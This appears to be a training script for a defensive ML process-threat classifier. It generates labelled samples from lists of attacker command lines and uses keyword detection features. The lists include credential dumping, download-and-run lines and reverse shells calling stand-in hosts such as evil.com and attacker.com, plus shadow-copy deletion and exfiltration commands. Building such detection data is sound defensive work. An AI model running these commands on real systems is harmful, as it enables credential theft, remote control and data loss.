#!/usr/bin/env python3
"""
FortifAI Hybrid ML Training
============================

Combines:
1. Synthetic data for process-based threats
2. Real threat intelligence from MITRE ATT&CK, VirusTotal, and security research
3. Your own labeled data (if provided)

Usage:
------
# Train with hybrid data
python scripts/train_hybrid.py --train

# Train with more samples
python scripts/train_hybrid.py --train --samples 30000

# Add your own data
python scripts/train_hybrid.py --train --custom-data my_labeled_data.csv

# Export training data for review
python scripts/train_hybrid.py --export-data
"""

import os
import sys
import json
import random
import argparse
import pandas as pd
import numpy as np
from pathlib import Path
from datetime import datetime
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder, StandardScaler
from sklearn.metrics import classification_report
import joblib

PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / 'ml-models' / 'threat-classification' / 'trained'
DATA_DIR = PROJECT_ROOT / 'ml-models' / 'training-data'


# =============================================================================
# THREAT INTELLIGENCE DATA
# Sources: MITRE ATT&CK, VirusTotal, Security Research Papers
# =============================================================================

# Known malicious tools and their MITRE ATT&CK techniques
MITRE_ATTACK_TOOLS = {
    # T1003 - Credential Dumping
    'credential_dumping': [
        {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe sekurlsa::logonpasswords', 'severity': 'critical'},
        {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe lsadump::sam', 'severity': 'critical'},
        {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe lsadump::dcsync', 'severity': 'critical'},
        {'name': 'procdump.exe', 'cmd': 'procdump.exe -ma lsass.exe', 'severity': 'critical'},
        {'name': 'procdump64.exe', 'cmd': 'procdump64.exe -accepteula -ma lsass.exe', 'severity': 'critical'},
        {'name': 'comsvcs.dll', 'cmd': 'rundll32.exe comsvcs.dll MiniDump', 'severity': 'critical'},
        {'name': 'ntdsutil.exe', 'cmd': 'ntdsutil.exe "ac i ntds" ifm', 'severity': 'critical'},
        {'name': 'secretsdump.py', 'cmd': 'python secretsdump.py', 'severity': 'critical'},
        {'name': 'lazagne.exe', 'cmd': 'lazagne.exe all', 'severity': 'high'},
    ],
    
    # T1059 - Command and Scripting Interpreter
    'malicious_scripts': [
        {'name': 'powershell.exe', 'cmd': 'powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=', 'severity': 'high'},
        {'name': 'powershell.exe', 'cmd': 'powershell.exe -nop -w hidden -enc', 'severity': 'high'},
        {'name': 'powershell.exe', 'cmd': 'powershell.exe IEX(New-Object Net.WebClient).downloadString', 'severity': 'critical'},
        {'name': 'powershell.exe', 'cmd': 'powershell.exe -ep bypass -file malware.ps1', 'severity': 'high'},
        {'name': 'powershell.exe', 'cmd': 'powershell.exe Invoke-Mimikatz', 'severity': 'critical'},
        {'name': 'cmd.exe', 'cmd': 'cmd.exe /c powershell -encodedcommand', 'severity': 'high'},
        {'name': 'wscript.exe', 'cmd': 'wscript.exe //E:vbscript malware.txt', 'severity': 'medium'},
        {'name': 'cscript.exe', 'cmd': 'cscript.exe //E:jscript payload.js', 'severity': 'medium'},
        {'name': 'mshta.exe', 'cmd': 'mshta.exe vbscript:Execute', 'severity': 'high'},
        {'name': 'mshta.exe', 'cmd': 'mshta.exe http://evil.com/payload.hta', 'severity': 'critical'},
    ],
    
    # T1021 - Remote Services / Lateral Movement
    'lateral_movement': [
        {'name': 'psexec.exe', 'cmd': 'psexec.exe \\\\target -s cmd.exe', 'severity': 'high'},
        {'name': 'psexec.exe', 'cmd': 'psexec.exe \\\\192.168.1.1 -u admin -p pass cmd', 'severity': 'critical'},
        {'name': 'psexec64.exe', 'cmd': 'psexec64.exe -accepteula \\\\target', 'severity': 'high'},
        {'name': 'wmic.exe', 'cmd': 'wmic.exe /node:target process call create', 'severity': 'high'},
        {'name': 'wmiexec.py', 'cmd': 'python wmiexec.py admin:pass@target', 'severity': 'critical'},
        {'name': 'smbexec.py', 'cmd': 'python smbexec.py domain/user:pass@target', 'severity': 'critical'},
        {'name': 'atexec.py', 'cmd': 'python atexec.py user:pass@target', 'severity': 'high'},
        {'name': 'winrm.cmd', 'cmd': 'winrs -r:target cmd', 'severity': 'medium'},
        {'name': 'evil-winrm.rb', 'cmd': 'evil-winrm -i target -u user -p pass', 'severity': 'critical'},
    ],
    
    # T1548 - Privilege Escalation
    'privilege_escalation': [
        {'name': 'winpeas.exe', 'cmd': 'winpeas.exe', 'severity': 'high'},
        {'name': 'winPEASx64.exe', 'cmd': 'winPEASx64.exe quiet', 'severity': 'high'},
        {'name': 'linpeas.sh', 'cmd': 'bash linpeas.sh', 'severity': 'high'},
        {'name': 'juicypotato.exe', 'cmd': 'juicypotato.exe -l 1337 -p cmd.exe -t *', 'severity': 'critical'},
        {'name': 'printspoofer.exe', 'cmd': 'printspoofer.exe -i -c cmd', 'severity': 'critical'},
        {'name': 'printspoofer64.exe', 'cmd': 'printspoofer64.exe -i -c powershell', 'severity': 'critical'},
        {'name': 'godpotato.exe', 'cmd': 'godpotato.exe -cmd cmd /c whoami', 'severity': 'critical'},
        {'name': 'sweetpotato.exe', 'cmd': 'sweetpotato.exe -p cmd.exe', 'severity': 'critical'},
        {'name': 'rottenpotato.exe', 'cmd': 'rottenpotato.exe', 'severity': 'critical'},
        {'name': 'seatbelt.exe', 'cmd': 'seatbelt.exe -group=all', 'severity': 'medium'},
        {'name': 'sharpup.exe', 'cmd': 'sharpup.exe', 'severity': 'medium'},
        {'name': 'powerup.ps1', 'cmd': 'powershell.exe -ep bypass -file powerup.ps1', 'severity': 'high'},
    ],
    
    # T1105 - Ingress Tool Transfer
    'download_execute': [
        {'name': 'certutil.exe', 'cmd': 'certutil.exe -urlcache -split -f http://evil.com/malware.exe', 'severity': 'high'},
        {'name': 'certutil.exe', 'cmd': 'certutil.exe -decode encoded.txt malware.exe', 'severity': 'high'},
        {'name': 'bitsadmin.exe', 'cmd': 'bitsadmin.exe /transfer job /download http://evil.com/mal.exe', 'severity': 'high'},
        {'name': 'curl.exe', 'cmd': 'curl.exe -o malware.exe http://evil.com/payload', 'severity': 'medium'},
        {'name': 'wget.exe', 'cmd': 'wget.exe http://evil.com/malware.exe', 'severity': 'medium'},
        {'name': 'Invoke-WebRequest', 'cmd': 'powershell.exe Invoke-WebRequest -Uri http://evil.com -OutFile mal.exe', 'severity': 'medium'},
    ],
    
    # T1087 - Account Discovery / Reconnaissance
    'reconnaissance': [
        {'name': 'bloodhound.exe', 'cmd': 'bloodhound.exe -c All', 'severity': 'critical'},
        {'name': 'sharphound.exe', 'cmd': 'sharphound.exe -c All --outputdirectory C:\\temp', 'severity': 'critical'},
        {'name': 'sharphound.ps1', 'cmd': 'powershell.exe -ep bypass Invoke-BloodHound', 'severity': 'critical'},
        {'name': 'adrecon.ps1', 'cmd': 'powershell.exe ./ADRecon.ps1', 'severity': 'high'},
        {'name': 'pingcastle.exe', 'cmd': 'pingcastle.exe --healthcheck', 'severity': 'medium'},
        {'name': 'rubeus.exe', 'cmd': 'rubeus.exe kerberoast', 'severity': 'critical'},
        {'name': 'rubeus.exe', 'cmd': 'rubeus.exe asreproast', 'severity': 'critical'},
        {'name': 'kerbrute.exe', 'cmd': 'kerbrute.exe userenum users.txt', 'severity': 'high'},
    ],
    
    # T1046 - Network Service Scanning
    'network_scanning': [
        {'name': 'nmap.exe', 'cmd': 'nmap.exe -sV -sC 192.168.1.0/24', 'severity': 'medium'},
        {'name': 'nmap.exe', 'cmd': 'nmap.exe -p- --min-rate 1000', 'severity': 'medium'},
        {'name': 'masscan.exe', 'cmd': 'masscan.exe -p1-65535 192.168.1.0/24', 'severity': 'medium'},
        {'name': 'angry_ip_scanner.exe', 'cmd': 'angry_ip_scanner.exe', 'severity': 'low'},
        {'name': 'advanced_port_scanner.exe', 'cmd': 'advanced_port_scanner.exe', 'severity': 'low'},
    ],
    
    # Ransomware patterns
    'ransomware': [
        {'name': 'encrypt.exe', 'cmd': 'encrypt.exe --recursive C:\\Users', 'severity': 'critical'},
        {'name': 'locker.exe', 'cmd': 'locker.exe --wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', 'severity': 'critical'},
        {'name': 'cryptor.exe', 'cmd': 'cryptor.exe -aes256 -all', 'severity': 'critical'},
        {'name': 'vssadmin.exe', 'cmd': 'vssadmin.exe delete shadows /all /quiet', 'severity': 'critical'},
        {'name': 'wbadmin.exe', 'cmd': 'wbadmin.exe delete catalog -quiet', 'severity': 'critical'},
        {'name': 'bcdedit.exe', 'cmd': 'bcdedit.exe /set {default} recoveryenabled no', 'severity': 'high'},
        {'name': 'cipher.exe', 'cmd': 'cipher.exe /w:C:', 'severity': 'high'},
    ],
    
    # C2 / Reverse Shells
    'command_control': [
        {'name': 'nc.exe', 'cmd': 'nc.exe -e cmd.exe attacker.com 4444', 'severity': 'critical'},
        {'name': 'nc64.exe', 'cmd': 'nc64.exe -lvp 4444', 'severity': 'high'},
        {'name': 'ncat.exe', 'cmd': 'ncat.exe --exec cmd.exe --allow attacker.com -l 4444', 'severity': 'critical'},
        {'name': 'powercat.ps1', 'cmd': 'powershell.exe powercat -c attacker.com -p 4444 -e cmd', 'severity': 'critical'},
        {'name': 'cobalt_strike', 'cmd': 'beacon.exe', 'severity': 'critical'},
        {'name': 'meterpreter', 'cmd': 'metsvc.exe', 'severity': 'critical'},
        {'name': 'empire', 'cmd': 'launcher.bat', 'severity': 'critical'},
    ],
    
    # Data Exfiltration
    'data_exfiltration': [
        {'name': 'rclone.exe', 'cmd': 'rclone.exe copy C:\\Confidential remote:exfil', 'severity': 'critical'},
        {'name': 'rclone.exe', 'cmd': 'rclone.exe sync C:\\Users\\Documents mega:backup', 'severity': 'high'},
        {'name': 'megasync.exe', 'cmd': 'megasync.exe --upload C:\\SensitiveData', 'severity': 'high'},
        {'name': '7z.exe', 'cmd': '7z.exe a -ppassword archive.7z C:\\Confidential', 'severity': 'medium'},
        {'name': 'rar.exe', 'cmd': 'rar.exe a -hp archive.rar C:\\Data', 'severity': 'medium'},
    ],
}

# Known malware families and their process names (from VirusTotal/security research)
KNOWN_MALWARE_NAMES = [
    # Trojans
    'emotet.exe', 'trickbot.exe', 'qbot.exe', 'icedid.exe', 'dridex.exe',
    'zloader.exe', 'bazarloader.exe', 'hancitor.exe', 'ursnif.exe', 'gozi.exe',
    
    # RATs (Remote Access Trojans)
    'njrat.exe', 'darkcomet.exe', 'nanocore.exe', 'asyncrat.exe', 'quasarrat.exe',
    'remcos.exe', 'orcusrat.exe', 'netwire.exe', 'warzone.exe', 'agent_tesla.exe',
    
    # Ransomware
    'ryuk.exe', 'conti.exe', 'lockbit.exe', 'revil.exe', 'blackcat.exe',
    'maze.exe', 'egregor.exe', 'darkside.exe', 'babuk.exe', 'hive.exe',
    'blackmatter.exe', 'avoslocker.exe', 'alphv.exe',
    
    # Miners
    'xmrig.exe', 'cgminer.exe', 'bfgminer.exe', 'cpuminer.exe', 'minerd.exe',
    'nicehash.exe', 'ethminer.exe', 'phoenixminer.exe',
    
    # Worms
    'wannacry.exe', 'notpetya.exe', 'conficker.exe', 'mydoom.exe',
    
    # Backdoors
    'chinachopper.exe', 'webshell.exe', 'regeorg.exe', 'chisel.exe',
    
    # Typosquatting (look like legitimate but are malware)
    'svchosts.exe', 'scvhost.exe', 'svhost.exe', 'svchost32.exe',
    'csrs.exe', 'csrrs.exe', 'cssrs.exe', 'csrss32.exe',
    'explore.exe', 'explorar.exe', 'explorer32.exe',
    'lsas.exe', 'lsass32.exe', 'lsasss.exe',
    'winlogin.exe', 'winlogon32.exe',
    'taskhost.exe', 'taskhosts.exe',
    'rundl32.exe', 'rundll.exe',
    'chrome_update.exe', 'firefox_update.exe', 'flash_update.exe',
]

# Legitimate processes (whitelist) - expanded list
LEGITIMATE_PROCESSES = [
    # Windows Core
    'System', 'System Idle Process', 'Registry', 'Memory Compression',
    'svchost.exe', 'csrss.exe', 'lsass.exe', 'services.exe', 'wininit.exe',
    'winlogon.exe', 'explorer.exe', 'smss.exe', 'spoolsv.exe', 'dwm.exe',
    'SearchIndexer.exe', 'SearchUI.exe', 'SearchApp.exe', 'RuntimeBroker.exe',
    'taskhostw.exe', 'ShellExperienceHost.exe', 'sihost.exe', 'fontdrvhost.exe',
    'ctfmon.exe', 'audiodg.exe', 'conhost.exe', 'dllhost.exe', 'wmiprvse.exe',
    'WmiPrvSE.exe', 'msiexec.exe', 'TrustedInstaller.exe', 'WUDFHost.exe',
    'dasHost.exe', 'SecurityHealthService.exe', 'SecurityHealthSystray.exe',
    'SgrmBroker.exe', 'MpCmdRun.exe', 'NisSrv.exe',
    
    # Windows Defender / Security
    'MsMpEng.exe', 'MpCopyAccelerator.exe', 'MsSense.exe', 'SenseIR.exe',
    'smartscreen.exe', 'SecurityHealthHost.exe',
    
    # Browsers
    'chrome.exe', 'firefox.exe', 'msedge.exe', 'brave.exe', 'opera.exe',
    'iexplore.exe', 'vivaldi.exe', 'safari.exe', 'chromium.exe',
    
    # Development
    'Code.exe', 'code.exe', 'devenv.exe', 'rider64.exe', 'pycharm64.exe',
    'idea64.exe', 'webstorm64.exe', 'goland64.exe', 'clion64.exe',
    'python.exe', 'python3.exe', 'pythonw.exe', 'python3.11.exe', 'python3.12.exe',
    'node.exe', 'npm.exe', 'npx.exe', 'yarn.exe', 'pnpm.exe',
    'java.exe', 'javaw.exe', 'javaws.exe',
    'dotnet.exe', 'MSBuild.exe', 'csc.exe', 'vbc.exe',
    'go.exe', 'rustc.exe', 'cargo.exe', 'rustup.exe',
    'gcc.exe', 'g++.exe', 'make.exe', 'cmake.exe', 'ninja.exe',
    'tsc.exe', 'webpack.exe', 'vite.exe', 'esbuild.exe', 'rollup.exe',
    
    # Docker & Containers
    'docker.exe', 'Docker Desktop.exe', 'com.docker.backend.exe',
    'com.docker.proxy.exe', 'com.docker.service.exe', 'dockerd.exe',
    'wsl.exe', 'wslhost.exe', 'wslservice.exe', 'wslg.exe',
    
    # Shells & Terminals
    'bash.exe', 'sh.exe', 'zsh.exe', 'fish.exe', 'dash.exe',
    'cmd.exe', 'powershell.exe', 'pwsh.exe', 'WindowsTerminal.exe',
    'mintty.exe', 'ConEmuC.exe', 'ConEmuC64.exe',
    
    # Git & Version Control
    'git.exe', 'git-remote-https.exe', 'git-credential-manager.exe',
    'ssh.exe', 'ssh-agent.exe', 'ssh-add.exe', 'gpg.exe', 'gpg-agent.exe',
    
    # Office & Productivity
    'OUTLOOK.EXE', 'WINWORD.EXE', 'EXCEL.EXE', 'POWERPNT.EXE',
    'ONENOTE.EXE', 'MSACCESS.EXE', 'lync.exe', 'Teams.exe',
    'Slack.exe', 'Discord.exe', 'Zoom.exe', 'ZoomIt.exe',
    'Skype.exe', 'Telegram.exe', 'WhatsApp.exe', 'Signal.exe',
    
    # Media & Graphics
    'Spotify.exe', 'vlc.exe', 'wmplayer.exe', 'mpc-hc64.exe',
    'Photoshop.exe', 'Illustrator.exe', 'AfterFX.exe', 'Premiere.exe',
    'GIMP.exe', 'Blender.exe', 'OBS64.exe', 'obs64.exe',
    
    # Database
    'postgres.exe', 'mysql.exe', 'mysqld.exe', 'mongod.exe',
    'redis-server.exe', 'sqlservr.exe', 'oracle.exe',
    
    # Cloud & Sync
    'OneDrive.exe', 'Dropbox.exe', 'GoogleDriveSync.exe',
    'iCloudServices.exe', 'SyncThing.exe',
    
    # Utilities
    'notepad.exe', 'notepad++.exe', 'sublime_text.exe', 'atom.exe',
    '7zFM.exe', '7zG.exe', 'WinRAR.exe', 'peazip.exe',
    'Everything.exe', 'ProcessHacker.exe', 'procexp.exe', 'procexp64.exe',
    'Autoruns.exe', 'Autoruns64.exe', 'tcpview.exe',
]


class HybridTrainingDataGenerator:
    """Generate training data from multiple sources"""
    
    def __init__(self):
        self.threat_categories = [
            'normal', 'malware', 'ransomware', 'trojan',
            'ddos', 'brute_force', 'data_exfiltration', 'privilege_escalation',
            'reconnaissance', 'lateral_movement', 'credential_dumping'
        ]
    
    def generate_normal_sample(self) -> dict:
        """Generate a legitimate process sample"""
        proc_name = random.choice(LEGITIMATE_PROCESSES)
        
        # Simulate realistic resource usage based on process type
        if proc_name in ['chrome.exe', 'firefox.exe', 'msedge.exe']:
            cpu = random.uniform(0, 70)
            mem = random.uniform(2, 30)
        elif proc_name in ['python.exe', 'node.exe', 'java.exe', 'MSBuild.exe']:
            cpu = random.uniform(0, 100)  # Dev tools can use 100% CPU
            mem = random.uniform(1, 35)
        elif proc_name in ['MsMpEng.exe', 'SearchIndexer.exe']:
            cpu = random.uniform(0, 80)
            mem = random.uniform(2, 10)
        elif 'System' in proc_name:
            cpu = random.uniform(0, 5) if 'Idle' not in proc_name else random.uniform(80, 99)
            mem = random.uniform(0, 1)
        else:
            cpu = random.uniform(0, 30)
            mem = random.uniform(0.5, 8)
        
        return {
            'process_name': proc_name,
            'cmdline': proc_name,
            'cpu_usage': cpu,
            'memory_usage': mem,
            'has_network': random.choice([0, 0, 0, 1]),
            'connections': random.randint(0, 20),
            'is_system_user': 1 if 'svc' in proc_name.lower() or 'system' in proc_name.lower() else 0,
            'label': 'normal',
            'source': 'synthetic_normal'
        }
    
    def generate_mitre_attack_sample(self) -> dict:
        """Generate sample from MITRE ATT&CK patterns"""
        category = random.choice(list(MITRE_ATTACK_TOOLS.keys()))
        tool = random.choice(MITRE_ATTACK_TOOLS[category])
        
        # Map MITRE categories to our labels
        label_map = {
            'credential_dumping': 'credential_dumping',
            'malicious_scripts': 'malware',
            'lateral_movement': 'lateral_movement',
            'privilege_escalation': 'privilege_escalation',
            'download_execute': 'malware',
            'reconnaissance': 'reconnaissance',
            'network_scanning': 'reconnaissance',
            'ransomware': 'ransomware',
            'command_control': 'trojan',
            'data_exfiltration': 'data_exfiltration',
        }
        
        return {
            'process_name': tool['name'],
            'cmdline': tool['cmd'],
            'cpu_usage': random.uniform(20, 80),
            'memory_usage': random.uniform(5, 25),
            'has_network': 1 if category in ['lateral_movement', 'command_control', 'data_exfiltration'] else random.choice([0, 1]),
            'connections': random.randint(1, 50) if category in ['network_scanning', 'brute_force'] else random.randint(0, 10),
            'is_system_user': 0,
            'label': label_map.get(category, 'malware'),
            'source': f'mitre_{category}',
            'severity': tool.get('severity', 'high')
        }
    
    def generate_known_malware_sample(self) -> dict:
        """Generate sample from known malware names"""
        malware_name = random.choice(KNOWN_MALWARE_NAMES)
        
        # Determine label based on naming patterns
        if 'rat' in malware_name.lower() or 'trojan' in malware_name.lower():
            label = 'trojan'
        elif any(r in malware_name.lower() for r in ['ryuk', 'conti', 'lockbit', 'revil', 'ransomware']):
            label = 'ransomware'
        elif 'miner' in malware_name.lower() or 'xmrig' in malware_name.lower():
            label = 'ddos'  # Treat miners as resource abuse
        elif any(t in malware_name.lower() for t in ['svchosts', 'csrs', 'explore', 'lsas', 'winlogin']):
            label = 'trojan'  # Typosquatting
        else:
            label = 'malware'
        
        return {
            'process_name': malware_name,
            'cmdline': f'{malware_name} --silent',
            'cpu_usage': random.uniform(30, 95),
            'memory_usage': random.uniform(10, 40),
            'has_network': 1,
            'connections': random.randint(1, 30),
            'is_system_user': 0,
            'label': label,
            'source': 'known_malware'
        }
    
    def generate_brute_force_sample(self) -> dict:
        """Generate brute force attack sample"""
        tools = [
            {'name': 'hydra.exe', 'cmd': 'hydra.exe -l admin -P wordlist.txt ssh://target'},
            {'name': 'medusa.exe', 'cmd': 'medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh'},
            {'name': 'ncrack.exe', 'cmd': 'ncrack.exe -p 22,3389 -U users.txt -P pass.txt target'},
            {'name': 'crowbar.exe', 'cmd': 'crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt'},
            {'name': 'patator.exe', 'cmd': 'patator.exe ssh_login host=target user=admin password=FILE0'},
            {'name': 'john.exe', 'cmd': 'john.exe --wordlist=rockyou.txt hashes.txt'},
            {'name': 'hashcat.exe', 'cmd': 'hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt'},
        ]
        tool = random.choice(tools)
        
        return {
            'process_name': tool['name'],
            'cmdline': tool['cmd'],
            'cpu_usage': random.uniform(40, 100),
            'memory_usage': random.uniform(5, 20),
            'has_network': 1,
            'connections': random.randint(50, 500),
            'is_system_user': 0,
            'label': 'brute_force',
            'source': 'brute_force_tools'
        }
    
    def generate_ddos_sample(self) -> dict:
        """Generate DDoS/resource abuse sample"""
        tools = [
            {'name': 'loic.exe', 'cmd': 'loic.exe --target 192.168.1.1 --port 80'},
            {'name': 'hoic.exe', 'cmd': 'hoic.exe'},
            {'name': 'slowloris.py', 'cmd': 'python slowloris.py target.com'},
            {'name': 'hping3.exe', 'cmd': 'hping3.exe --flood -p 80 target.com'},
            {'name': 'stress.exe', 'cmd': 'stress.exe --cpu 8 --io 4'},
            {'name': 'xmrig.exe', 'cmd': 'xmrig.exe -o pool.mining.com:3333 -u wallet'},
        ]
        tool = random.choice(tools)
        
        return {
            'process_name': tool['name'],
            'cmdline': tool['cmd'],
            'cpu_usage': random.uniform(80, 100),
            'memory_usage': random.uniform(10, 40),
            'has_network': 1,
            'connections': random.randint(100, 2000),
            'is_system_user': 0,
            'label': 'ddos',
            'source': 'ddos_tools'
        }
    
    def generate_dataset(self, n_samples: int = 20000, custom_data: pd.DataFrame = None) -> pd.DataFrame:
        """Generate hybrid training dataset"""
        samples = []
        
        # Distribution: 65% normal, 35% threats
        n_normal = int(n_samples * 0.65)
        n_threats = n_samples - n_normal
        
        print(f"Generating {n_normal} normal samples...")
        for _ in range(n_normal):
            samples.append(self.generate_normal_sample())
        
        # Distribute threats across categories
        threat_generators = [
            ('MITRE ATT&CK', self.generate_mitre_attack_sample, 0.4),
            ('Known Malware', self.generate_known_malware_sample, 0.25),
            ('Brute Force', self.generate_brute_force_sample, 0.15),
            ('DDoS', self.generate_ddos_sample, 0.2),
        ]
        
        for name, generator, ratio in threat_generators:
            count = int(n_threats * ratio)
            print(f"Generating {count} {name} samples...")
            for _ in range(count):
                samples.append(generator())
        
        # Add custom data if provided
        if custom_data is not None and len(custom_data) > 0:
            print(f"Adding {len(custom_data)} custom samples...")
            for _, row in custom_data.iterrows():
                samples.append(row.to_dict())
        
        random.shuffle(samples)
        df = pd.DataFrame(samples)
        
        # Print summary
        print(f"\n{'='*60}")
        print("DATASET SUMMARY")
        print(f"{'='*60}")
        print(f"Total samples: {len(df)}")
        print(f"\nBy label:")
        for label in df['label'].unique():
            count = len(df[df['label'] == label])
            pct = 100 * count / len(df)
            print(f"  {label}: {count} ({pct:.1f}%)")
        
        if 'source' in df.columns:
            print(f"\nBy source:")
            for source in df['source'].unique():
                count = len(df[df['source'] == source])
                print(f"  {source}: {count}")
        
        return df


def extract_features(row: dict) -> dict:
    """Extract ML features from a data point"""
    name = str(row.get('process_name', '')).lower()
    cmd = str(row.get('cmdline', '')).lower()
    
    return {
        'cpu_usage': float(row.get('cpu_usage', 0) or 0),
        'memory_usage': float(row.get('memory_usage', 0) or 0),
        'name_length': len(name),
        'cmd_length': len(cmd),
        'has_args': 1 if ' ' in cmd else 0,
        'has_network': int(row.get('has_network', 0) or 0),
        'connections': int(row.get('connections', 0) or 0),
        'is_system_user': int(row.get('is_system_user', 0) or 0),
        
        # Encoded/obfuscated commands
        'encoded_cmd': 1 if any(p in cmd for p in ['encodedcommand', '-enc ', 'base64', '-e ']) else 0,
        
        # Download patterns
        'download_cmd': 1 if any(p in cmd for p in ['download', 'wget', 'curl', 'invoke-webrequest', 'urlcache']) else 0,
        
        # Connection/shell patterns
        'connect_cmd': 1 if any(p in cmd for p in ['connect', 'reverse', 'shell', '-e cmd', 'nc ', 'ncat']) else 0,
        
        # Encryption/ransomware patterns
        'encrypt_cmd': 1 if any(p in cmd for p in ['encrypt', 'ransom', 'locker', 'vssadmin', 'wbadmin delete']) else 0,
        
        # Credential dumping patterns
        'cred_dump': 1 if any(p in cmd for p in ['sekurlsa', 'lsadump', 'procdump', 'lsass', 'sam', 'ntds']) else 0,
        
        # Known tools
        'is_mimikatz': 1 if 'mimikatz' in name or 'sekurlsa' in cmd else 0,
        'is_psexec': 1 if 'psexec' in name else 0,
        'is_bloodhound': 1 if any(p in name for p in ['bloodhound', 'sharphound']) else 0,
        'is_cobalt': 1 if any(p in name for p in ['beacon', 'cobalt']) else 0,
        
        # Typosquatting detection
        'has_typo': 1 if name in [n.lower() for n in KNOWN_MALWARE_NAMES if 'svc' in n.lower() or 'csr' in n.lower() or 'explore' in n.lower()] else 0,
        
        # Known malware name
        'known_malware': 1 if name.replace('.exe', '') in [n.lower().replace('.exe', '') for n in KNOWN_MALWARE_NAMES] else 0,
        
        # Lateral movement patterns
        'lateral_movement': 1 if any(p in cmd for p in ['\\\\', 'wmic', 'winrm', 'psexec', 'wmiexec']) else 0,
        
        # Privilege escalation patterns
        'priv_esc': 1 if any(p in name for p in ['potato', 'winpeas', 'powerup', 'seatbelt', 'sharpup']) else 0,
    }


def train_models(df: pd.DataFrame, output_dir: Path) -> dict:
    """Train and save ML models"""
    print(f"\n{'='*60}")
    print("TRAINING ML MODELS")
    print(f"{'='*60}")
    
    # Extract features
    print("\nExtracting features...")
    features = [extract_features(row) for _, row in df.iterrows()]
    X = pd.DataFrame(features)
    
    # Encode labels
    le = LabelEncoder()
    y = le.fit_transform(df['label'])
    
    # Scale features
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)
    
    # Split
    X_train, X_test, y_train, y_test = train_test_split(
        X_scaled, y, test_size=0.2, random_state=42, stratify=y
    )
    
    print(f"Training: {len(X_train)} samples")
    print(f"Testing: {len(X_test)} samples")
    print(f"Classes: {list(le.classes_)}")
    
    # Train Random Forest
    print("\nTraining Random Forest...")
    rf = RandomForestClassifier(
        n_estimators=300,
        max_depth=20,
        min_samples_split=5,
        class_weight='balanced',
        random_state=42,
        n_jobs=-1
    )
    rf.fit(X_train, y_train)
    rf_score = rf.score(X_test, y_test)
    print(f"  Accuracy: {rf_score:.4f}")
    
    # Train Gradient Boosting
    print("\nTraining Gradient Boosting...")
    gb = GradientBoostingClassifier(
        n_estimators=150,
        max_depth=10,
        learning_rate=0.1,
        random_state=42
    )
    gb.fit(X_train, y_train)
    gb_score = gb.score(X_test, y_test)
    print(f"  Accuracy: {gb_score:.4f}")
    
    # Classification report
    print(f"\n{'='*60}")
    print("CLASSIFICATION REPORT")
    print(f"{'='*60}")
    y_pred = rf.predict(X_test)
    print(classification_report(y_test, y_pred, target_names=le.classes_))
    
    # Feature importance
    print("\nTop 15 Important Features:")
    importance = pd.Series(rf.feature_importances_, index=X.columns).sort_values(ascending=False)
    for feat, imp in importance.head(15).items():
        print(f"  {feat}: {imp:.4f}")
    
    # Save models
    output_dir.mkdir(parents=True, exist_ok=True)
    
    joblib.dump(rf, output_dir / 'rf_model.joblib')
    joblib.dump(gb, output_dir / 'gb_model.joblib')
    joblib.dump(scaler, output_dir / 'scaler.joblib')
    joblib.dump(le, output_dir / 'label_encoder.joblib')
    
    with open(output_dir / 'feature_columns.json', 'w') as f:
        json.dump(list(X.columns), f)
    
    metadata = {
        'trained_at': datetime.now().isoformat(),
        'samples': len(df),
        'rf_accuracy': float(rf_score),
        'gb_accuracy': float(gb_score),
        'classes': list(le.classes_),
        'feature_columns': list(X.columns),
        'data_sources': list(df['source'].unique()) if 'source' in df.columns else ['unknown']
    }
    with open(output_dir / 'model_metadata.json', 'w') as f:
        json.dump(metadata, f, indent=2)
    
    print(f"\n✓ Models saved to {output_dir}")
    
    return metadata


def test_model(output_dir: Path):
    """Test model with sample data"""
    print(f"\n{'='*60}")
    print("TESTING MODEL")
    print(f"{'='*60}")
    
    if not (output_dir / 'rf_model.joblib').exists():
        print("✗ No trained model found.")
        return
    
    rf = joblib.load(output_dir / 'rf_model.joblib')
    scaler = joblib.load(output_dir / 'scaler.joblib')
    le = joblib.load(output_dir / 'label_encoder.joblib')
    
    test_cases = [
        # Normal processes
        {'name': 'chrome.exe (normal)', 'process_name': 'chrome.exe', 'cmdline': 'chrome.exe', 'cpu_usage': 45, 'memory_usage': 15, 'connections': 5, 'expected': 'normal'},
        {'name': 'python.exe high CPU (normal)', 'process_name': 'python.exe', 'cmdline': 'python.exe train.py', 'cpu_usage': 95, 'memory_usage': 20, 'connections': 0, 'expected': 'normal'},
        {'name': 'svchost.exe (normal)', 'process_name': 'svchost.exe', 'cmdline': 'svchost.exe -k netsvcs', 'cpu_usage': 5, 'memory_usage': 3, 'connections': 10, 'expected': 'normal'},
        
        # Malware
        {'name': 'mimikatz.exe', 'process_name': 'mimikatz.exe', 'cmdline': 'mimikatz.exe sekurlsa::logonpasswords', 'cpu_usage': 40, 'memory_usage': 10, 'connections': 0, 'expected': 'threat'},
        {'name': 'svchosts.exe (typo)', 'process_name': 'svchosts.exe', 'cmdline': 'svchosts.exe -connect evil.com', 'cpu_usage': 30, 'memory_usage': 8, 'connections': 5, 'expected': 'threat'},
        {'name': 'ransomware', 'process_name': 'locker.exe', 'cmdline': 'locker.exe --encrypt --wallet bc1q', 'cpu_usage': 80, 'memory_usage': 15, 'connections': 1, 'expected': 'threat'},
        {'name': 'psexec lateral', 'process_name': 'psexec.exe', 'cmdline': 'psexec.exe \\\\target -s cmd.exe', 'cpu_usage': 20, 'memory_usage': 5, 'connections': 3, 'expected': 'threat'},
        {'name': 'bloodhound', 'process_name': 'sharphound.exe', 'cmdline': 'sharphound.exe -c All', 'cpu_usage': 60, 'memory_usage': 20, 'connections': 10, 'expected': 'threat'},
        {'name': 'encoded powershell', 'process_name': 'powershell.exe', 'cmdline': 'powershell.exe -encodedcommand JABjAGw=', 'cpu_usage': 30, 'memory_usage': 10, 'connections': 1, 'expected': 'threat'},
    ]
    
